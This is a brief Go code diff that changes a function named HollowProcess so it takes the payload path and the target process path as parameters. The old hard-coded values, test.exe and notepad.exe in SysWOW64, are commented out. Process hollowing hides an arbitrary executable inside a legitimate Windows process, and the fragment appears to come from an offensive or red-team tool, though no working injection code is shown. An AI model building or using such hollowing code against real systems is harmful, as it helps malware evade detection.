@@ -7,9 +7,9 @@ import (
 )
 
 //HollowProcess func
-func HollowProcess() bool {
-	payloadPath := `test.exe`
-	targetPath := `C:\Windows\SysWOW64\notepad.exe`
+func HollowProcess(payloadPath, targetPath string) bool {
+	//payloadPath := `test.exe`
+	//targetPath := `C:\Windows\SysWOW64\notepad.exe`
 
 	//1. Load the payload:
 	var payloadImageSize uint64
